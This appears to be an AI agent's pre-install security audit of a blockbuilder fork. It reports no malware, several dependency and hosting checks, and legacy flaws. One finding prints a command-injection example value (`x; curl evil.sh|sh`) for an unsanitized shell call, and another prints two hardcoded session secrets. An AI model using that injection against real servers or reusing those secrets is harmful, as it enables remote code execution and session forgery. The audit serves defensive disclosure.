# Security Audit: blockbuilder (fork of enjalot/blockbuilder)

Audit date: 2026-07-07
Auditor: Claude Code (automated pre-install security audit, `/audit-clone` process)
Repo: `/home/m/wk/blockbuilder` — fork of the well-known open-source project [enjalot/blockbuilder](https://github.com/enjalot/blockbuilder)

## Executive Summary

**VERDICT: CLEAN** (no malicious code found; legacy security weaknesses noted below)

This is a legitimate ~2015–2019 Node.js/Express + React 0.14 application for editing d3.js
blocks (GitHub gists) in the browser, historically deployed at blockbuilder.org. The codebase
matches its stated purpose. There is **no evidence of malware, obfuscation, data exfiltration,
typosquatted dependencies, or install-time attack vectors**. All 1,037 locked dependencies
resolve to the official npm registry. There are no preinstall/postinstall hooks in the project
itself, no suspicious network endpoints, and no hardcoded third-party credentials.

The project does carry **age-related security debt** (deprecated/vulnerable dependency
versions, hardcoded session-secret fallbacks, a command-injection-prone thumbnail module) that
matters if you intend to *run it as a public server*, but none of it is malicious and none of
it executes at `npm install` / `yarn install` time beyond standard native-module builds.

## Project Overview

| Attribute | Value |
|---|---|
| Name | `building-blocks` v0.0.1 |
| Type | Node.js Express server + React 0.14 SPA (webpack 1 build) |
| Purpose | Browser editor for d3.js blocks / GitHub gists (bl.ocks.org companion) |
| Entry point | `server.js` (Express, ports 8889 HTTP / 8443 HTTPS) |
| Frontend | `public/js/` (React/Reflux, bundled to `public/build/js/main.js`) |
| Auth | GitHub OAuth via `passport-github`, `gist` scope |
| Data stores | MongoDB (users), Redis (sessions) — see `docker-compose.yml` |
| Node version | 12.3.0 (`.nvmrc`, `.node-version`) |
| License | BSD-3-Clause |
| Last commit | 2019-08-25 (bf0129c, merge of magic-sandbox bump) |
| History | 448 commits; fork remote `micahstubbs/blockbuilder` |
| File count | 67 tracked files (excluding `.git`) |

## Dependency Analysis

**Sources.** All dependencies in `package.json` are plain semver ranges from the npm registry.
There are **no git URLs, no http/tarball URLs, no `file:` deps**. `yarn.lock` was verified:
all 1,037 `resolved` entries point to `https://registry.yarnpkg.com` — zero
codeload/git+/git:// entries.

**Install scripts.** The project's own `package.json` has **no preinstall/postinstall/prepare
hooks** — only webpack build scripts (`local`, `buildWatch`, `build`, `buildProd`). Transitive
native modules with standard install-time builds: `node-sass` (binary download/libsass
compile) — a well-known, legitimate package, though this old major (4.x) is deprecated.

**Typosquat check.** All package names are canonical, widely used packages (express, react,
passport, mongodb, redis, superagent, request, nconf, jsdom, webpack, babel-*). Two oddities,
both benign:

- `install` (^0.4.1) — the real npm package of that name (a require-shim helper); its presence
  is a common accidental artifact of `npm i` typos in this era, not a typosquat.
- `wrappy` (^1.0.2) — legitimate npm-ecosystem utility, unusual as a *direct* dependency but
  harmless.

Domain-specific deps `blockbuilder-search`, `magic-sandbox`, `codemirror-inlet`,
`bragi-browser` are all real packages by the original author (enjalot) or community, matching
the project's purpose.

**Known-vulnerable (not malicious) versions.** Expected for a 2019-frozen tree: `request`
(deprecated), `node-sass` 4.x, `mongodb` 2.x driver, `jsdom` 12, `express-handlebars` 3.x,
webpack 1, babel 6, react 0.14. Running `yarn audit` would flag many CVEs; none are
supply-chain compromises, and the lockfile pins pre-2020 versions (predating the major
2021–2024 npm supply-chain attack waves).

## Code Analysis Checks

| Check | Result | Notes |
|---|---|---|
| `eval(` / `new Function` | PASS | None in project source (only a doc comment in `public/js/utils/throttle.js`) |
| `child_process` / `exec` | NOTED | Only in `thumbnail.js` — legitimate gist clone/commit/push flow (see Findings) |
| `curl \| bash` patterns | PASS | None |
| base64 / `atob` obfuscation | PASS | Base64 use is thumbnail PNG decode only (`thumbnail.js:90-91`, `server.js:341`) |
| Suspicious network endpoints | PASS | All endpoints are api.github.com, gist.github.com, bl.ocks.org, cdnjs, Google Fonts/Analytics, S3 sponsor logos, localhost ES/Redis/Mongo |
| Env var exfiltration | PASS | No `process.env` values sent over network; config via local `secrets.json` (gitignored) |
| Hardcoded credentials | NOTED | Placeholder values only in `secrets.json-example`; two hardcoded *fallback session secrets* in `server.js` (weakness, not exfiltration) |
| Hidden files | PASS | Only `.nvmrc`, `.node-version`, `.gitignore`, `.eslintrc.yml` — all benign configs |
| package.json scripts | PASS | Webpack build commands only |
| Shell scripts / Makefile / CI | PASS | `Makefile` = `npm install && npm run buildProd` + `git pull`; no CI configs present |
| `scripts/` directory | PASS | `gitpush.expect` (expect script feeding user/token to `git push` for the thumbnail flow), `userfix.js` (one-off local Mongo `_id` migration) |
| deploy/ configs | PASS | systemd unit, upstart script, monit config — standard ops files for the original blockbuilder.org host |
| Symlinks | NOTED | `public/inlet -> ../node_modules/codemirror-inlet/` — dangling until install; expected pattern |
| yarn.lock integrity | PASS | 1,037/1,037 packages resolve to registry.yarnpkg.com with sha1 integrity hashes |

## Findings

1. **Command construction from request data in the thumbnail module** —
   `thumbnail.js:45` (`child.exec("cd /tmp; git clone " + url)`), `thumbnail.js:57`
   (git add/commit), `thumbnail.js:99` (`child.exec("cd /tmp; rm -rf " + data.id)`).
   `data.id` comes from `req.body.gistId` (`server.js:340-342`, authenticated route
   `POST /api/thumbnail`) and is interpolated into shell commands **without sanitization**.
   A logged-in user could inject shell metacharacters (e.g. `gistId = "x; curl evil.sh|sh"`).
   This is a genuine **vulnerability in the original upstream design**, not planted malware —
   it only matters if you run the server publicly.

2. **Hardcoded fallback session/cookie secrets** — `server.js:92` (cookie secret
   `'d0f03jiioj>?re4l12kj"f23jiioj>?re4l12kj"l;l'`) and `server.js:109` (express-session
   secret `'f023u0fu0fi2039if023r09390jljnvcvoejfpeiqur384092830'`). Anyone running this code
   unmodified shares session-signing keys with every other deployment. Weakness, not malware.

3. **GitHub OAuth token handling** — user gist tokens are stored in Mongo user records and in
   Redis sessions (`server.js:143,177,181`), and passed as a CLI argument to the expect script
   (`thumbnail.js:72`, `scripts/gitpush.expect`), where it is briefly visible in the process
   table. Tokens go only to github.com — no third-party exfiltration.

4. **App-credential proxying (by design)** — `server.js:488-493,550-552` sends the app's
   GitHub `client_id`/`client_secret` (from local `secrets.json`) as query params to
   api.github.com to raise anonymous rate limits. Standard GitHub-app pattern of that era.

5. **External script/style loads** — `views/base.handlebars` loads CodeMirror 5.16, marked
   0.3.5, and d3 3.5.5 from cdnjs.cloudflare.com, fonts from Google, and optional Google
   Analytics. All canonical CDN URLs; no unknown hosts. (marked 0.3.5 has known XSS CVEs —
   age-related, not malicious.)

6. **Arbitrary user code execution in iframe (core product feature)** —
   `public/js/components/renderer.js` uses `magic-sandbox` to render user gist code in an
   iframe. This is the entire point of the app and is the standard bl.ocks sandboxing approach.

7. **`{{{json error}}}` triple-stash in `views/error.handlebars`** — unescaped JSON injected
   into a script tag; theoretical XSS if error content is attacker-controlled. Minor, legacy.

## Security Concerns (if you plan to run it)

- Do not expose `POST /api/thumbnail` publicly without fixing the shell-injection in
  `thumbnail.js` (validate `gistId` against `/^[0-9a-f]+$/` and/or use `execFile`).
- Replace both hardcoded secrets in `server.js` with values from `secrets.json`/env.
- The dependency tree is 2019-frozen and full of CVE-bearing versions; treat any deployment
  as a trusted-network/dev-only exercise, or plan a dependency modernization pass.
- `node-sass` 4.x requires Node ~12 to build (matches `.nvmrc` 12.3.0); it will fail to
  compile on modern Node — use nvm/n to select Node 12 before installing.

## Recommendations

1. **Safe to install dependencies** (`yarn install`) — preferably with Node 12.3.0 per
   `.nvmrc`, and optionally `--ignore-scripts` if you don't need `node-sass` to build.
2. Before any public deployment: fix Finding 1 (shell injection) and Finding 2 (hardcoded
   secrets); run `yarn audit` and upgrade or isolate.
3. Create `secrets.json` from `secrets.json-example` with your own GitHub OAuth app creds;
   confirm `secrets.json` stays gitignored (it is, via `.gitignore`).
4. If modernizing, replace `request` (deprecated), `node-sass` → `sass` (already present as a
   dep), and bump marked/CodeMirror CDN pins.

## Conclusion

The repository is a faithful, unmodified-in-spirit fork of the well-known enjalot/blockbuilder
project, frozen in 2019. Every dependency resolves to the official npm registry, there are no
install-time hooks in the project, no obfuscated code, no unexpected network destinations, and
no credential exfiltration. The issues found are ordinary legacy-webapp weaknesses in the
original upstream code (shell-command interpolation in the thumbnail flow, hardcoded session
secrets, aged CVE-bearing dependencies) that are relevant only for production deployment.

**VERDICT: CLEAN — safe to proceed with `yarn install` and local development.**
